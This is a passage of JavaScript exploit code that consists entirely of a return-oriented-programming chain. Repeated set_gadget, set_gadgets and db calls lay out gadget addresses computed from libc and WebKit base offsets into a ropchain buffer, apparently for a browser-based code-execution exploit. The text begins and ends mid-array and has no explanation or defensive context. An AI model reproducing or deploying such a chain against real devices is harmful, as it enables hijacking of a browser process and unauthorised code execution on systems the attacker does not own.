webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+223584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+223568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+223656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([12, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+223816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+223832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+223800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+223928, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+223912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+224024, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+224112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+224128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+224216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+224464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+224480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+224448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+224576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+224560, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+224672, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+224760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+224776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+224864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+225112, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+225128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225096, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+225224, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+225208, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+225320, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+225408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+225528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+225512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+225584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+225688, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+225776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+225936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+225904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225920, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+199296, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+226128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294966272, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+226240, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+147688, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+226328, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+226416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+226432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+226576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+226544, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+226560, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+213016, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+226768, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294966272, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+226848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+226904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+226984, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([128, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+227088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+227104, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+227192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+227248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+227376, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+147688, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966268, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+227504, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+227560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+227624, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966268, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+227712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+227728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+227880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+227912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+227864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+227896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+227984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+228000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+228096, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+228080, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+228176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+228328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+228344, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+228312, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+228512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+228528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+228496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+228632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+228680, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+228664, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+228792, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+228784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+228808, 
ropchain+228824, 
libc_base+811575, 
ropchain+228840, 
libc_base+811575, 
ropchain+231728, 
libc_base+788575 
]);
db([65, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+228944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+229032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+229184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+229200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+229168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+229288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+229448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+229416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+229520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+229576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+229672, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966268, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+229760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+229928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+229960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+229912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+230120, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+230088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+230072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+230192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230208, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+230296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+230352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+230472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230504, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+230488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+230656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+230640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+230672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+230760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+230872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+230856, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+230976, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+186040, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+231064, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966268, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+231152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+231168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+231320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+231352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+231304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+231336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+231448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+231432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+231536, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+231608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294966268, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+231672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+227568, 
libc_base+793877, 
ropchain+231784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+231872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+231888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+232024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+232040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+232008, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+232128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+232144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+232296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+232328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+232280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+232312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+232424, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+232408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+232528, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172888, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+232664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+232680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+232648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+232776, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+232760, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+232856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65, 0]); 
set_gadget(libc_base+788575,); 
db([65, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+233008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+233024, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+232992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+269973, 
libc_base+793877, 
ropchain+233184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+233200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+233168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+233304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+233352, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+233336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
